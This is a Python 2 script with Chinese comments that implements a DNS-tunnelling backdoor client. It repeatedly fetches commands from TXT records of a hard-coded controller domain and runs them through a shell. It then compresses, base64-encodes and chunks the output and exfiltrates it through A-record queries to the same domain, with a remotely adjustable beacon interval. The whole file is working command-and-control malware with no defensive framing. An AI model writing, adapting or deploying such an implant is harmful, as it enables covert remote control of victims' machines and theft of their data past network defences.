# -*- coding:utf-8 -*-

import socket
import struct
import random
import subprocess
import Queue
import zlib
import base64
import re
import time

dns_server = '192.10.22.22'  #ip上线则填ip,通过域名则填公共域名服务器如：8.8.8.8
port = 53
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sp = 10


# dns请求
def dns_query(query_type, domain):
    # 构造dns协议头
    qtypt = {'A': 0x0001, 'TXT': 0x0010}
    id = random.randint(-32768, 32767)
    idchars = struct.pack('!h', id)
    flags = 0x0100
    questions = 0x001
    auswerrrs = 0x0000
    authorityrrs = 0x0000
    additionalrrS = 0x0000
    bufheader = struct.pack('!hhhhhh', id, flags, questions, auswerrrs, authorityrrs, additionalrrS)
    # 构造dns协议尾
    searchtype = qtypt[query_type]
    searchclass = 0x0001
    buftail = struct.pack('!hh', searchtype, searchclass)
    # Queries区域
    domaintobyte = ''
    domainsplit = domain.split('.')
    for ds in domainsplit:
        packstr = 'B%ds' % len(ds)
        domaintobyte += struct.pack(packstr, len(ds), ds)
    domaintobyte += '\0'
    # 拼接完整请求
    querydata = bufheader + domaintobyte + buftail
    sock.sendto(querydata, (dns_server, port))
    data, addr = sock.recvfrom(8096)
    return data, idchars


# 解析返回包
def dns_answer(domain):
    data = dns_query('TXT', domain)[0]
    # 跳过协议头
    bitnumber = 12
    # 应答资源数
    answerrrs = struct.unpack('!h', data[6:8])[0]
    # 请求中域名结束后填充\x00, 在应答中表示域名结束，后面为answer内容
    while data[bitnumber] != '\x00':
        bitnumber += 1
    # 域名结束
    bitnumber += 1
    # 跳过请求中的Type,Class In
    bitnumber += 4
    for i in range(answerrrs):
        # 跳过表示指向请求中域名的c00c指针
        bitnumber += 2
        # 判断返回请求类型
        # A请求
        if data[bitnumber:bitnumber + 2] == '\x00\x01':
            # 跳过应答中的Type,Class In，TTL,data length
            bitnumber += 10
            # 获取ip，4个字节
            iptuple = struct.unpack('!BBBB', data[bitnumber:bitnumber + 4])
            ipstr = '%d.%d.%d.%d' % iptuple
            print ipstr
        # TXT请求
        elif data[bitnumber:bitnumber + 2] == '\x00\x10':
            # 跳过应答中的Type,Class In，TTL,data length
            bitnumber += 10
            # 获取 TXT Length
            txt_lenght = struct.unpack('!B', data[bitnumber:bitnumber + 1])[0]
            # 跳过TXT length 一个字节
            bitnumber += 1
            unpackstr = '!'
            for i in range(txt_lenght):
                unpackstr += 's'
            txt_tuple = struct.unpack(unpackstr, data[bitnumber:bitnumber + txt_lenght])
            txt_text = ''
            for i in txt_tuple:
                txt_text += i
            return txt_text


# 执行命令，zlib压缩命令输出再base64编码之后分割, 通过A请求发送到服务器
def exec_command(command):
    post_queue = Queue.Queue()
    global sp
    print sp
    if command is not None:
        if 'sleep' in command:
            sp = int(command.split(' ')[1])
        try:
            ss = zlib.compress(subprocess.check_output(command, shell=True))
            ss_b64 = base64.b64encode(ss)
            # 公共域名解析服务器在域名请求中不支持+ = 替换
            ll = ss_b64.replace('+', '-').replace('=', '~')
        except BaseException, e:
            if repr(e) == 'CalledProcessError()':
                ss = zlib.compress('command error')
                ss_b64 = base64.b64encode(ss)
                # 公共域名解析服务器在域名请求中不支持+ = 替换
                ll = ss_b64.replace('+', '-').replace('=', '~')
    if len(ll) < 51 and len(ll) != 0:
        post_queue.put(ll)
        post_queue.put('end')
    # 分割
    else:
        textArr = re.findall('.{51}', ll)
        textArr.append(ll[(len(textArr) * 51):])
        length = len(textArr)
        if length / 4 != 0:
            mod = length % 4
            for i in range(length / 4):
                post_queue.put(textArr[i * 4 + 0] + '.' + textArr[i * 4 + 1] + '.' + textArr[i * 4 + 2] + '.' +
                               textArr[i * 4 + 3])
            for i in range(mod):
                post_queue.put(textArr[length / 4 * 4 + i])
            # 以end 标志传输完成
            post_queue.put('end')
        
        else:
            for i in range(length):
                post_queue.put(textArr[i])
            post_queue.put('end')
    while post_queue.empty() is not True:
        dns_query('A', post_queue.get() + '.' + domain)


def connect():
    for i in range(10):
        try:
            data, id = dns_query('A', 'success.ns1.pangjie.ml')
            if data[0:2] == id:
                return True
                break
            else:
                return False
        except:
            pass


if __name__ == '__main__':
    domain = 'ns1.pangjie.ml'
    connect()
    while True:
        command = dns_answer(domain)               
        exec_command(command)
        time.sleep(sp)

